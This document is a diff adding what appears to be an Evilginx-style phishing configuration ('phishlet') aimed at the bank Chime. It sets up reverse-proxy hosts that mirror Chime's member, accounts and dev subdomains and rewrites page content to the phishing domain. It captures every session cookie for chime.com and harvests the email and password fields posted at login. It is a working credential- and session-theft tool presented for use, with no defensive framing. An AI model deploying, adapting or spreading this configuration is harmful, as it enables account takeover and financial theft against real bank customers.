@@ -1,0 +1,40 @@
+author: '@babydoll'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: '', domain: 'chime.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'member', orig_sub: 'member', domain: 'member.chime.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'dev', orig_sub: 'dev', domain: 'dev.chime.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'accounts.chime.com', session: true, is_landing: false, auto_filter: true}
+  # - {phish_sub: 'play', orig_sub: 'play', domain: 'google.com', session: false, is_landing: false, auto_filter: false}
+
+sub_filters:
+  - {triggers_on: 'chime.com', orig_sub: '', domain: 'chime.com', search: 'chime.com', replace: '{domain}', mimes: ['text/html', 'text/javascript', 'application/json']}
+  - {triggers_on: 'member.chime.com', orig_sub: 'member', domain: 'chime.com', search: 'member.chime.com', replace: 'member.{domain}', mimes: ['text/html', 'text/javascript', 'application/json']}
+  - {triggers_on: 'dev.chime.com', orig_sub: 'dev', domain: 'chime.com', search: 'dev.chime.com', replace: 'dev.{domain}', mimes: ['text/html', 'text/javascript', 'application/json']}
+  - {triggers_on: 'accounts.chime.com', orig_sub: 'accounts', domain: 'chime.com', search: 'accounts.chime.com', replace: 'accounts.{domain}', mimes: ['text/html', 'text/javascript', 'application/json']}
+
+auth_tokens:
+  - domain: '.chime.com'
+    keys: ['.*,regexp']
+  -domain: 'member.chime.com'
+    keys: ['.*, regexp']
+
+credentials:
+  username:
+    key: 'user_email'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'user_password'
+    search: '(.*)'
+    type: 'post'
+  ##custom:
+    #- key: 'fkey'
+    #  search: '(.*)'
+    #  type: 'post'
+auth_urls:
+  - '/'
+  - '/users/sign_in'
+login:
+  domain: 'member.chime.com'
+  path: '/users/login'
